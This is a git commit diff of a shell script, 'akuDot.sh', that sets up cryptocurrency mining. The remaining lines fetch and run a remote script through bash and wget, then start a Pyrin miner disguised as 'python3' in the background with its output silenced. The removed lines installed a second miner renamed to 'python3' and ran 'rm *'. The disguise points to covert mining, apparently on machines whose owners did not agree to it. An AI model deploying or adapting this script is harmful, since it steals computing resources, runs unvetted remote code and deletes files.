cce8ebea5ba834cc4feb054bbdd6dbb80f0fa3b6
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-28 07:17:04 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -5,19 +5,3 @@ apt install screen -y
 bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"
 
 nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
-
-wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
-
-tar -xzf dot
-
-rm dot
-
-mv cpuminer-sse2 python3
-
-mv python3 ~/
-
-rm *
-
-cd ~/
-
-screen ./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT -t 4
